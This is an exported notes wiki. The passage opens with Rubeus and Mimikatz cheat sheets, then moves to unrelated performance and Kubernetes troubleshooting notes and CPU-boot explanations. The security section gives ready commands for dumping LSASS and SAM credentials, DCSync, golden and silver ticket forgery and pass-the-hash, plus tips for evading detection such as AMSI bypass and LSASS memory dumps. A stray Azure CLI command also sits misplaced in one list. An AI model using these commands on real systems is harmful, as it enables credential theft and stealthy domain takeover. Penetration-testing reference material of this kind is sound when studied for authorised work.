<h2 id="ticket-operations-2"><a class="header" href="#ticket-operations-2">Ticket Operations</a></h2>
<h3 id="describe-a-ticket-1"><a class="header" href="#describe-a-ticket-1">Describe a Ticket</a></h3>
<pre><code class="language-cmd">Rubeus.exe describe /ticket:&lt;base64_or_path&gt;
</code></pre>
<p>Shows ticket details including:</p>
<ul>
<li>Service name</li>
<li>User name</li>
<li>Start/End times</li>
<li>Flags</li>
<li>Encryption type</li>
</ul>
<h3 id="renew-a-tgt-1"><a class="header" href="#renew-a-tgt-1">Renew a TGT</a></h3>
<pre><code class="language-cmd">Rubeus.exe renew /ticket:&lt;base64_or_path&gt; /nowrap
</code></pre>
<h3 id="purge-all-tickets"><a class="header" href="#purge-all-tickets">Purge All Tickets</a></h3>
<pre><code class="language-cmd">Rubeus.exe purge
</code></pre>
<h3 id="purge-specific-luid"><a class="header" href="#purge-specific-luid">Purge Specific LUID</a></h3>
<pre><code class="language-cmd">Rubeus.exe purge /luid:0x6c680
</code></pre>
<hr>
<h2 id="hash-calculation-1"><a class="header" href="#hash-calculation-1">Hash Calculation</a></h2>
<p>Calculate Kerberos hashes from a plaintext password:</p>
<pre><code class="language-cmd">Rubeus.exe hash /user:john /domain:domain.local /password:Password123!
</code></pre>
<p>Output:</p>
<pre><code>rc4_hmac             : 64F12CDDAA88057E06A81B54E73B949B
aes128_cts_hmac_sha1 : 9e5f1e63b7b3e8f...
aes256_cts_hmac_sha1 : b21c99fc068e3ab...
des_cbc_md5          : ...
</code></pre>
<hr>
<h2 id="monitoring-for-tickets"><a class="header" href="#monitoring-for-tickets">Monitoring for Tickets</a></h2>
<p>Monitor for new TGTs (useful during lateral movement):</p>
<pre><code class="language-cmd">Rubeus.exe monitor /interval:5
</code></pre>
<p>Filter for specific user:</p>
<pre><code class="language-cmd">Rubeus.exe monitor /interval:5 /filteruser:Administrator
</code></pre>
<hr>
<h2 id="common-options-7"><a class="header" href="#common-options-7">Common Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>/nowrap</code></td><td>Don‚Äôt wrap Base64 output</td></tr>
<tr><td><code>/ptt</code></td><td>Import ticket into current session</td></tr>
<tr><td><code>/dc:&lt;ip&gt;</code></td><td>Specify domain controller</td></tr>
<tr><td><code>/domain:&lt;domain&gt;</code></td><td>Specify domain name</td></tr>
<tr><td><code>/user:&lt;user&gt;</code></td><td>Specify username</td></tr>
<tr><td><code>/outfile:&lt;path&gt;</code></td><td>Save output to file</td></tr>
<tr><td><code>/luid:&lt;luid&gt;</code></td><td>Target specific logon session</td></tr>
<tr><td><code>/format:hashcat</code></td><td>Output in Hashcat-compatible format</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="powershell-helpers"><a class="header" href="#powershell-helpers">PowerShell Helpers</a></h2>
<h3 id="convert-kirbi-to-base64"><a class="header" href="#convert-kirbi-to-base64">Convert .kirbi to Base64</a></h3>
<pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
</code></pre>
<h3 id="convert-base64-to-kirbi"><a class="header" href="#convert-base64-to-kirbi">Convert Base64 to .kirbi</a></h3>
<pre><code class="language-powershell">[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("&lt;base64&gt;"))
</code></pre>
<hr>
<h2 id="detection-and-evasion"><a class="header" href="#detection-and-evasion">Detection and Evasion</a></h2>
<h3 id="common-detection-points"><a class="header" href="#common-detection-points">Common Detection Points</a></h3>
<ul>
<li>Unusual Kerberos ticket requests (Event ID 4768, 4769)</li>
<li>Service ticket requests for sensitive SPNs</li>
<li>AS-REQ without pre-authentication</li>
<li>High volume of TGS requests (Kerberoasting)</li>
</ul>
<h3 id="evasion-techniques-1"><a class="header" href="#evasion-techniques-1">Evasion Techniques</a></h3>
<ul>
<li>Use AES encryption instead of RC4 (less suspicious)</li>
<li>Use <code>/opsec</code> flag for reduced detection footprint</li>
<li>Limit ticket requests to avoid anomaly detection</li>
<li>Use sacrificial processes to isolate activity</li>
</ul>
<hr>
<h2 id="related-tools-5"><a class="header" href="#related-tools-5">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>Mimikatz</td><td>Windows credential extraction and ticket manipulation</td></tr>
<tr><td>Impacket</td><td>Python toolkit with GetTGT, GetST, GetUserSPNs</td></tr>
<tr><td>Kekeo</td><td>Advanced Kerberos toolkit by gentilkiwi</td></tr>
<tr><td>PowerView</td><td>PowerShell AD enumeration</td></tr>
<tr><td>BloodHound</td><td>AD attack path mapping</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="core-takeaways-7"><a class="header" href="#core-takeaways-7">Core Takeaways</a></h2>
<ul>
<li>Use <code>/nowrap</code> for Base64 output to simplify copy-paste</li>
<li><code>asktgt</code> with <code>/ptt</code> is the quickest way to request and use a ticket</li>
<li><code>createnetonly</code> prevents overwriting your current session‚Äôs tickets</li>
<li>Kerberoasting and AS-REP roasting are key techniques for credential extraction</li>
<li>S4U attacks enable impersonation when constrained delegation is configured</li>
<li>AES256 is preferred over RC4 for both security and stealth</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="mimikatz"><a class="header" href="#mimikatz">Mimikatz</a></h1>
<p>Mimikatz is a Windows post-exploitation tool developed by Benjamin Delpy that extracts credentials, hashes, PINs, and Kerberos tickets from memory. It is one of the most widely used tools for credential theft and lateral movement in Windows environments.</p>
<h2 id="key-capabilities-3"><a class="header" href="#key-capabilities-3">Key Capabilities</a></h2>
<ul>
<li><strong>Credential Extraction</strong>: Dump plaintext passwords, hashes, and Kerberos tickets from LSASS memory</li>
<li><strong>Pass-the-Hash/Pass-the-Ticket</strong>: Use extracted credentials for lateral movement</li>
<li><strong>DPAPI Attacks</strong>: Decrypt Windows Data Protection API protected secrets</li>
<li><strong>Golden/Silver Tickets</strong>: Forge Kerberos tickets for persistence</li>
<li><strong>DCSync</strong>: Replicate credentials from Domain Controllers</li>
</ul>
<hr>
<h2 id="installation-10"><a class="header" href="#installation-10">Installation</a></h2>
<p>Mimikatz is not installed via package managers. Download from the official repository:</p>
<pre><code>https://github.com/gentilkiwi/mimikatz/releases
</code></pre>
<p>For evasion, consider using:</p>
<ul>
<li><strong>Invoke-Mimikatz</strong>: PowerShell version</li>
<li><strong>pypykatz</strong>: Python implementation (cross-platform)</li>
</ul>
<hr>
<h2 id="basic-usage-6"><a class="header" href="#basic-usage-6">Basic Usage</a></h2>
<h3 id="enable-debug-privileges"><a class="header" href="#enable-debug-privileges">Enable Debug Privileges</a></h3>
<pre><code>privilege::debug
</code></pre>
<p>Required for accessing LSASS memory. Returns <code>Privilege '20' OK</code> on success.</p>
<h3 id="dump-all-credentials-from-lsass"><a class="header" href="#dump-all-credentials-from-lsass">Dump All Credentials from LSASS</a></h3>
<pre><code>sekurlsa::logonpasswords
</code></pre>
<h3 id="dump-credential-manager-secrets"><a class="header" href="#dump-credential-manager-secrets">Dump Credential Manager Secrets</a></h3>
<pre><code>sekurlsa::credman
</code></pre>
<h3 id="export-kerberos-tickets"><a class="header" href="#export-kerberos-tickets">Export Kerberos Tickets</a></h3>
<pre><code>sekurlsa::tickets /export
</code></pre>
<hr>
<h2 id="common-modules"><a class="header" href="#common-modules">Common Modules</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>sekurlsa</code></td><td>Extract credentials from LSASS memory</td></tr>
<tr><td><code>lsadump</code></td><td>Dump LSA secrets, SAM database, DCSync</td></tr>
<tr><td><code>kerberos</code></td><td>Kerberos ticket operations</td></tr>
<tr><td><code>vault</code></td><td>Windows Vault/Credential Manager</td></tr>
<tr><td><code>dpapi</code></td><td>DPAPI masterkey and blob decryption</td></tr>
<tr><td><code>crypto</code></td><td>Certificate and key operations</td></tr>
<tr><td><code>token</code></td><td>Token manipulation</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="sekurlsa-module-1"><a class="header" href="#sekurlsa-module-1">sekurlsa Module</a></h2>
<h3 id="dump-logon-passwords"><a class="header" href="#dump-logon-passwords">Dump Logon Passwords</a></h3>
<pre><code>sekurlsa::logonpasswords
</code></pre>
<h3 id="dump-credential-manager"><a class="header" href="#dump-credential-manager">Dump Credential Manager</a></h3>
<pre><code>sekurlsa::credman
</code></pre>
<h3 id="dump-dpapi-masterkeys"><a class="header" href="#dump-dpapi-masterkeys">Dump DPAPI Masterkeys</a></h3>
<pre><code>sekurlsa::dpapi
</code></pre>
<h3 id="dump-kerberos-tickets"><a class="header" href="#dump-kerberos-tickets">Dump Kerberos Tickets</a></h3>
<pre><code>sekurlsa::tickets
</code></pre>
<h3 id="pass-the-hash-2"><a class="header" href="#pass-the-hash-2">Pass-the-Hash</a></h3>
<pre><code>sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:&lt;hash&gt; /run:cmd
</code></pre>
<h3 id="dump-kerberos-encryption-keys"><a class="header" href="#dump-kerberos-encryption-keys">Dump Kerberos Encryption Keys</a></h3>
<pre><code>sekurlsa::ekeys
</code></pre>
<p>Extracts AES256, AES128, and RC4 keys for Kerberos authentication. Useful for Pass the Key / OverPass the Hash attacks.</p>
<h3 id="pass-the-key--overpass-the-hash"><a class="header" href="#pass-the-key--overpass-the-hash">Pass the Key / OverPass the Hash</a></h3>
<pre><code>sekurlsa::pth /user:Administrator /domain:DOMAIN /aes256:&lt;aes256_hash&gt; /run:cmd
</code></pre>
<p>Converts a Kerberos key (AES256, AES128, or RC4) into a full TGT. The spawned process can then request service tickets for lateral movement.</p>
<hr>
<h2 id="lsadump-module-1"><a class="header" href="#lsadump-module-1">lsadump Module</a></h2>
<h3 id="dump-sam-database-1"><a class="header" href="#dump-sam-database-1">Dump SAM Database</a></h3>
<pre><code>lsadump::sam
</code></pre>
<h3 id="dump-lsa-secrets-1"><a class="header" href="#dump-lsa-secrets-1">Dump LSA Secrets</a></h3>
<pre><code>lsadump::secrets
</code></pre>
<h3 id="dump-cached-domain-credentials-1"><a class="header" href="#dump-cached-domain-credentials-1">Dump Cached Domain Credentials</a></h3>
<pre><code>lsadump::cache
</code></pre>
<h3 id="dcsync-requires-domain-admin-or-replication-rights"><a class="header" href="#dcsync-requires-domain-admin-or-replication-rights">DCSync (requires Domain Admin or replication rights)</a></h3>
<pre><code>lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /all /csv
</code></pre>
<hr>
<h2 id="kerberos-attacks-1"><a class="header" href="#kerberos-attacks-1">Kerberos Attacks</a></h2>
<h3 id="golden-ticket-requires-krbtgt-hash"><a class="header" href="#golden-ticket-requires-krbtgt-hash">Golden Ticket (requires krbtgt hash)</a></h3>
<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:&lt;hash&gt; /ptt
</code></pre>
<h3 id="silver-ticket-requires-service-account-hash"><a class="header" href="#silver-ticket-requires-service-account-hash">Silver Ticket (requires service account hash)</a></h3>
<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:&lt;hash&gt; /ptt
</code></pre>
<h3 id="pass-the-ticket"><a class="header" href="#pass-the-ticket">Pass-the-Ticket</a></h3>
<pre><code>kerberos::ptt &lt;ticket.kirbi&gt;
</code></pre>
<h3 id="list-tickets"><a class="header" href="#list-tickets">List Tickets</a></h3>
<pre><code>kerberos::list
</code></pre>
<h3 id="purge-tickets"><a class="header" href="#purge-tickets">Purge Tickets</a></h3>
<pre><code>kerberos::purge
</code></pre>
<hr>
<h2 id="dpapi-attacks"><a class="header" href="#dpapi-attacks">DPAPI Attacks</a></h2>
<h3 id="list-vault-credentials-1"><a class="header" href="#list-vault-credentials-1">List Vault Credentials</a></h3>
<pre><code>vault::list
vault::cred
</code></pre>
<h3 id="decrypt-dpapi-blob"><a class="header" href="#decrypt-dpapi-blob">Decrypt DPAPI Blob</a></h3>
<pre><code>dpapi::blob /in:&lt;blob_file&gt; /masterkey:&lt;key&gt;
</code></pre>
<h3 id="decrypt-credential-file-1"><a class="header" href="#decrypt-credential-file-1">Decrypt Credential File</a></h3>
<pre><code>dpapi::cred /in:&lt;credential_file&gt;
</code></pre>
<h3 id="extract-masterkey-with-rpc-to-dc"><a class="header" href="#extract-masterkey-with-rpc-to-dc">Extract Masterkey (with RPC to DC)</a></h3>
<pre><code>dpapi::masterkey /in:&lt;masterkey_file&gt; /rpc
</code></pre>
<hr>
<h2 id="offline-attacks"><a class="header" href="#offline-attacks">Offline Attacks</a></h2>
<h3 id="dump-sam-from-registry-hives"><a class="header" href="#dump-sam-from-registry-hives">Dump SAM from Registry Hives</a></h3>
<pre><code>lsadump::sam /sam:sam.hive /system:system.hive
</code></pre>
<h3 id="dump-secrets-from-registry-hives"><a class="header" href="#dump-secrets-from-registry-hives">Dump Secrets from Registry Hives</a></h3>
<pre><code>lsadump::secrets /system:system.hive /security:security.hive
</code></pre>
<hr>
<h2 id="one-liner-examples"><a class="header" href="#one-liner-examples">One-Liner Examples</a></h2>
<h3 id="full-credential-dump-2"><a class="header" href="#full-credential-dump-2">Full Credential Dump</a></h3>
<pre><code>mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
</code></pre>
<h3 id="dcsync-single-user"><a class="header" href="#dcsync-single-user">DCSync Single User</a></h3>
<pre><code>mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
</code></pre>
<h3 id="export-all-kerberos-tickets-1"><a class="header" href="#export-all-kerberos-tickets-1">Export All Kerberos Tickets</a></h3>
<pre><code>mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
</code></pre>
<hr>
<h2 id="detection-and-evasion-1"><a class="header" href="#detection-and-evasion-1">Detection and Evasion</a></h2>
<h3 id="common-detection-points-1"><a class="header" href="#common-detection-points-1">Common Detection Points</a></h3>
<ul>
<li>LSASS memory access</li>
<li>Suspicious process creation</li>
<li>Event ID 4624 (logon) with unusual patterns</li>
<li>Sysmon Event ID 10 (process access to LSASS)</li>
</ul>
<h3 id="evasion-techniques-2"><a class="header" href="#evasion-techniques-2">Evasion Techniques</a></h3>
<ul>
<li>Use <code>pypykatz</code> for offline analysis</li>
<li>Memory dump LSASS with <code>procdump</code>, analyze offline</li>
<li>Use <code>Invoke-Mimikatz</code> with AMSI bypass</li>
<li>Obfuscated/custom-compiled versions</li>
</ul>
<hr>
<h2 id="related-tools-6"><a class="header" href="#related-tools-6">Related Tools</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Tool</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>pypykatz</td><td>Python implementation (cross-platform)</td></tr>
<tr><td>SharpKatz</td><td>C# implementation</td></tr>
<tr><td>Rubeus</td><td>C# Kerberos toolkit</td></tr>
<tr><td>Impacket</td><td>Python toolkit with secretsdump.py</td></tr>
<tr><td>LaZagne</td><td>Multi-platform credential recovery</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="core-takeaways-8"><a class="header" href="#core-takeaways-8">Core Takeaways</a></h2>
<ul>
<li>Always run <code>privilege::debug</code> first to enable LSASS access</li>
<li><code>sekurlsa::logonpasswords</code> is the go-to command for credential extraction</li>
<li>DCSync requires Domain Admin or specific replication rights</li>
<li>Kerberos attacks (Golden/Silver tickets) provide powerful persistence</li>
<li>DPAPI attacks can recover Credential Manager, browser, and application secrets</li>
<li>Consider offline analysis to avoid detection</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-2"><a class="header" href="#troubleshooting-2">Troubleshooting</a></h1>
<h2 id="directory-map-29"><a class="header" href="#directory-map-29">Directory Map</a></h2>
<ul>
<li><a href="troubleshooting/linux">linux</a></li>
<li><a href="troubleshooting/troubleshooting_playbook">troubleshooting_playbook</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="performance-mantras"><a class="header" href="#performance-mantras">Performance Mantras</a></h1>
<p>This is a tuning methodology that shows how best to improve performance, listing actionable items in order from most to least effective.</p>
<ol>
<li>Don‚Äôt do it. (Eliminate unnecessary work)</li>
<li>Do it, but don‚Äôt do it again. (caching)</li>
<li>Do it less. (tune refreshes, polling, or updates to be less frequent)</li>
<li>Do it later. (Write-back caching)</li>
<li>Do it when they‚Äôre not looking. (schedule work to run off-peak hours)</li>
<li>Do it concurrently. (switch from single to multi-threaded)</li>
<li>Do it more cheaply. (buy faster hardware)</li>
</ol>
<p><em>Credits to Scott Emmons @ Netflix</em></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="the-problem-statement"><a class="header" href="#the-problem-statement">The Problem Statement</a></h1>
<p>Defining the problem statement is a routine task completed as a first step when starting a investigation.</p>
<p>It is characterised as:</p>
<ol>
<li>What makes you think there is a performance problem?</li>
<li>Has this system ever performed well?</li>
<li>What changed recently? Software? Hardware? Load?</li>
<li>Can the problem be expressed in terms of latency or runtime?</li>
<li>Does the problem affect everyone or a subset of users?</li>
<li>What is the environment? What software and hardware are used? Versions? Configuration?</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="red-method"><a class="header" href="#red-method">RED Method</a></h1>
<p>The focus of the RED method is services. Typically, cloud services in a microservices architecture.</p>
<p>It can be summarized as:
For every service, check the request rate, errors, and duration per request</p>
<p>The metrics to check are:</p>
<ol>
<li>Request rate: The number of requests per second</li>
<li>Errors: The number of requests that failed</li>
<li>Duration: The time for requests to completes</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="use-method"><a class="header" href="#use-method">USE Method</a></h1>
<p>The utilization, saturation, and errors method should be used early in a performance investigation to identify systemic bottlenecks. It can be summarized as:</p>
<ol>
<li>For every resource, check utilization, saturation, and errors.</li>
</ol>
<p>Steps</p>
<ol>
<li>The first step is to list resources involved (CPUs, RAM, NICs, storage devices, accelerators (GPUs, TPUs, etc.), controllers (storage, network), interconnects)</li>
<li>Once you have a list of resources, consider the metric types available for each
az aks nodepool update ‚Äìresource-group rc-02us1-kubernetes-01-rg ‚Äìcluster-name rc-02us1-kubernetes-01-cluster  ‚Äìname nplinux02 ‚Äìlabels k8s.aprimo.com/workloadType=scoring ‚Äìno-wait</li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="linux"><a class="header" href="#linux">Linux</a></h1>
<h2 id="directory-map-30"><a class="header" href="#directory-map-30">Directory Map</a></h2>
<ul>
<li><a href="#troubleshooting-memory">memory</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-memory"><a class="header" href="#troubleshooting-memory">Troubleshooting Memory</a></h1>
<h3 id="file-system-paging"><a class="header" href="#file-system-paging">File System Paging</a></h3>
<p>File system paging is caused by the reading and writing of of pages in memory-mapped files. When needed, the kernel can free memory by paging some out. If a file system page has been modified in main memory (called dirty), the page out will require it to be written to disk. If, instead, the file system page has not been modified (called clean), the page out simply frees the memory for immediate reuse, since a copy already exists on disk.</p>
<h3 id="anonymous-paging-swapping"><a class="header" href="#anonymous-paging-swapping">Anonymous Paging (swapping)</a></h3>
<p>Anonymous paging involves data that is private to a process; the process heap and stack. It is termed anonymous because it has no named location in the operating system. Anonymous page-outs require moving data to the physical swap locations or swap files. Linux uses the term swapping for this type of paging. Anonymous paging hurts performance and has therefore been referred to as ‚Äòbad paging‚Äô. When applications access memory pages that have been paged out, they block on the disk I/O required to read them back to main memory. This is called ‚Äòanonymous page-in‚Äô, which introduces latency to applications.</p>
<h3 id="how-the-operating-system-deals-with-memory-saturation"><a class="header" href="#how-the-operating-system-deals-with-memory-saturation">How the operating system deals with memory saturation:</a></h3>
<ul>
<li>Paging</li>
<li>Reaping</li>
<li>OOM killer</li>
</ul>
<h3 id="working-set-size"><a class="header" href="#working-set-size">Working Set Size</a></h3>
<ul>
<li>Working Set Size (WSS) is the amount of main memory a process frequently uses to perform work. It is a useful concept for memory perforamnce tuning. Performance should greatly improve if the WSS can fit in the CPU caches, rather than main memory. Also, performance will degrade if the WSS exceeds the amount of main memory, as this additional overhead will involve swapping.</li>
</ul>
<h3 id="memory-hardware"><a class="header" href="#memory-hardware">Memory Hardware</a></h3>
<ul>
<li>
<p>RAM (Main Memory): Dynamic RAM (DRAM), provides high-density storage; each bit is implemented as a capacitor and a transistor; requires a constant refresh to maintain charge. The access time of RAM can be measured as the column address strobe (CAS) latency. CAS is the time between sending a memory module the desired address to fetch and when the data is available to read. For DDR4 it is around 10-20 nanoseconds.</p>
</li>
<li>
<p>CPU caches</p>
<ul>
<li>Level 1: Usually split into separate instruction and data caches</li>
<li>Level 2: A cache for both instructions and data</li>
<li>Level 3: Another larger level of cache</li>
</ul>
</li>
</ul>
<h3 id="mmu-memory-management-unit"><a class="header" href="#mmu-memory-management-unit">MMU (Memory Management Unit)</a></h3>
<ul>
<li>The MMU is response for virtual-to-physical address translations. These are performed per-page, and offsets within a page are mapped directly.</li>
</ul>
<h3 id="tlb-translation-lookaside-buffer"><a class="header" href="#tlb-translation-lookaside-buffer">TLB (Translation Lookaside Buffer)</a></h3>
<ul>
<li>The TLB is used by the MMU as the first level of address translation cache, followed by the page table in main memory.</li>
</ul>
<h3 id="tools-5"><a class="header" href="#tools-5">Tools</a></h3>
<ul>
<li><code>vmstat</code></li>
<li><code>swapon</code></li>
<li><code>sar</code></li>
<li><code>slabtop</code></li>
<li><code>numastat</code></li>
<li><code>ps</code></li>
<li><code>top</code> / <code>htop</code></li>
<li><code>pmap</code></li>
<li><code>perf</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-playbook"><a class="header" href="#troubleshooting-playbook">Troubleshooting Playbook</a></h1>
<h2 id="directory-map-31"><a class="header" href="#directory-map-31">Directory Map</a></h2>
<ul>
<li><a href="#troubleshooting-503s-for-apps-in-kubernetes">kubernetes-containerized-app-503s</a></li>
<li><a href="#general-troubleshootingnotes">kubernetes-general</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="troubleshooting-503s-for-apps-in-kubernetes"><a class="header" href="#troubleshooting-503s-for-apps-in-kubernetes">Troubleshooting 503s for Apps in Kubernetes</a></h1>
<h3 id="get-the-precise-time-of-the-503-occurrences"><a class="header" href="#get-the-precise-time-of-the-503-occurrences">Get the precise time of the 503 occurrences</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:25:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
nginxAccessLogs
| where time_iso8601 between (start .. end)
| where host endswith ".aprimo.com"
| where status == 503
| where request_uri has '/api/ui/unauth-init'
| make-series count() default = 0 on time_iso8601 from start to end step 1s by host
| render timechart
</code></pre>
<h3 id="check-if-there-were-any-pods-running-during-the-incident"><a class="header" href="#check-if-there-were-any-pods-running-during-the-incident">Check if there were any pods running during the incident:</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:00:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
let nameprefix = "pod name prefix"
KubePodInventory
| where TimeGenerated between (start .. end)
| where Name contains nameprefix
| make-series count() default = 0 on TimeGenerated from start to end step 1m by PodStatus
| render timechart
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="general-troubleshootingnotes"><a class="header" href="#general-troubleshootingnotes">General troubleshooting/notes</a></h1>
<h3 id="get-pod-names-running-in-a-replica-set-at-a-given-time"><a class="header" href="#get-pod-names-running-in-a-replica-set-at-a-given-time">Get pod names running in a replica set at a given time</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:00:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
let nameprefix = "pod name prefix"
KubePodInventory
| where TimeGenerated between (start .. end)
| where Name startswith nameprefix
| distinct Name
</code></pre>
<h3 id="get-node-names-running-during-a-given-time-duration"><a class="header" href="#get-node-names-running-during-a-given-time-duration">Get node names running during a given time duration:</a></h3>
<pre><code>let start = todatetime('2023-11-07T04:00:00Z');
let end = todatetime('2023-11-07T05:00:00Z');
let nameprefix = "aksnpwin8"
KubeNodeInventory
| where TimeGenerated between (start .. end)
| where Computer startswith nameprefix
</code></pre>
<h3 id="get-cpu-utilization-avg-per-microservice"><a class="header" href="#get-cpu-utilization-avg-per-microservice">Get CPU Utilization Avg Per Microservice</a></h3>
<pre><code>let _ResourceLimitCounterName = 'cpuLimitNanoCores';
let _ResourceUsageCounterName = 'cpuUsageNanoCores';
KubePodInventory
| where Namespace in ('dam-c000', 'pm-r01')
| extend
    InstanceName = strcat(ClusterId, '/', ContainerName),
    ContainerName = strcat(ControllerName, '/', tostring(split(ContainerName, '/')[1]))
| distinct Computer, InstanceName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceLimitCounterName
    | summarize MaxLimitValue = max(CounterValue) by Computer, InstanceName, bin(TimeGenerated, _BinSize)
    | project
        Computer,
        InstanceName,
        MaxLimitValue
    )
    on Computer, InstanceName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceUsageCounterName
    | project Computer, InstanceName, UsageValue = CounterValue, TimeGenerated
    )
    on Computer, InstanceName
| project
    ContainerName = tostring(split(InstanceName, '/')[10]),
    Computer,
    TimeGenerated,
    UsagePercent = UsageValue * 100.0 / MaxLimitValue
| summarize AvgCPUUsagePercentage = avg(UsagePercent) by bin(TimeGenerated, 1h), ContainerName
| render timechart;
</code></pre>
<h3 id="get-memory-utilization-avg-per-microservice"><a class="header" href="#get-memory-utilization-avg-per-microservice">Get Memory Utilization Avg per Microservice</a></h3>
<pre><code>let _ResourceLimitCounterName = 'memoryLimitBytes';
let _ResourceUsageCounterName = 'memoryWorkingSetBytes';
KubePodInventory
| where Namespace in ('dam-c000', 'pm-r01')
| extend InstanceName = strcat(ClusterId, '/', ContainerName),
    ContainerName = strcat(ControllerName, '/', tostring(split(ContainerName, '/')[1]))
| distinct Computer, InstanceName, ContainerName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceLimitCounterName
    | summarize MaxLimitValue = max(CounterValue) by Computer, InstanceName, bin(TimeGenerated, 1h)
    | project
        Computer,
        InstanceName,
        MaxLimitValue
    )
    on Computer, InstanceName
| join kind=inner hint.strategy=shuffle (
    Perf
    | where ObjectName == 'K8SContainer' and CounterName == _ResourceUsageCounterName
    | project Computer, InstanceName, UsageValue = CounterValue, TimeGenerated
    )
    on Computer, InstanceName
| project
    AppName = tostring(split(InstanceName, '/')[10]),
    Computer,
    TimeGenerated,
    UsagePercent = UsageValue * 100.0 / MaxLimitValue
| summarize MemoryUsagePercentage = avg(UsagePercent) by bin(TimeGenerated, 1h), AppName
| render timechart;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-happens-when"><a class="header" href="#what-happens-when">What Happens When‚Ä¶</a></h1>
<h2 id="directory-map-32"><a class="header" href="#directory-map-32">Directory Map</a></h2>
<ul>
<li><a href="#what-happens-when-a-cpu-starts">a-cpu-starts</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="what-happens-when-a-cpu-starts"><a class="header" href="#what-happens-when-a-cpu-starts">What happens when a CPU starts?</a></h1>
<ul>
<li>
<p>When a CPU receives power, it resets by receiving a pulse on its <code>RESET</code> (or RST) pin. This is because when the power supply is first powering up, even if it only takes a second or two, the CPU has already received ‚Äúdirty‚Äù power, because the power supply was building up a steady stream of electricity while powering up. Digital logic chips like CPUs require precise voltages, and they get confused if they receive something outside their intended voltage range. This is why the CPU must be reset immediately after powering up. The reset pin must be activated for a certain number of clock cycles to fully reset the CPU.</p>
</li>
<li>
<p>After being reset, the CPU can get to work. The CPU gets some instructions from memory, in what is known as a ‚Äòfetch‚Äô cycle. Memory can be either RAM or ROM. RAM is like the CPUs workbench. ROM stored code that is read-only and controls the system itself. The CPU always fetches code from ROM first so that it knows what its job is. The CPU address memory (both RAM and ROM) through the address bus. The CPU has two buses, the address bus and the data bus. The memory responds to this request from the CPU on the address bus by sending the contents of the selected memory address over the data bus, back to the CPU.</p>
</li>
<li>
<p>Every CPU has a particular point in memory where it begins reading instructions after it has been reset. Some CPUs will jump to a set memory address and begin executing that code. Other CPUs have a ‚Äòreset vector‚Äô, which means that it first checks a particular point in memory for a number which is the memory address to begin executing instructions at.</p>
</li>
<li>
<p>The CPU contains a register (internal cache memory, extremely fast) called the instruction pointer, which contains a number. The number in the instruction pointer (IP) is the memory address at which the next instruction is to be performed. The IP is incremented with each instruction, and in the event of a jump (JMP) instruction, which tells the CPU to jump to another location and start running the instructions there, the IP is set to the jump location and then CPU continues on its way from there. The CPU‚Äôs instructions are sometimes called ‚Äúopcodes‚Äù. They are simply strings of binary 1s and 0s which together form an instruction. For example, on a standard Intel 80x86 CPU (such as a 486 or Pentium), the opcode 90h (or 10010000 binary) is a NOP (no operation) opcode. NOP is the simplest instruction in any CPU, and it simply means to do nothing and go on to the next instruction. If a cell in RAM or ROM contains this opcode and the CPU executes it, it will perform a NOP (in other words, it will do nothing) and then IP will be set to the next memory cell. (On some computer platforms, the instruction pointer is called the ‚Äúprogram counter‚Äù, inexplicably abbreviated ‚ÄúPG‚Äù. However, on the PC (as in ‚ÄúIBM PC‚Äù) platform, the term ‚Äúinstruction pointer‚Äù is usually used, because that term is preferred by Intel with regard to its 80x86 CPU family.)</p>
</li>
<li>
<p>Regardless of where the CPU begins getting its instructions, the beginning point should always be somewhere in a ROM chip. The computer needs startup instructions to perform basic hardware checking and preparation (POST), and these are contained in a ROM chip on the motherboard called the BIOS. This is where any computer begins executing its code when it is turned on.</p>
</li>
<li>
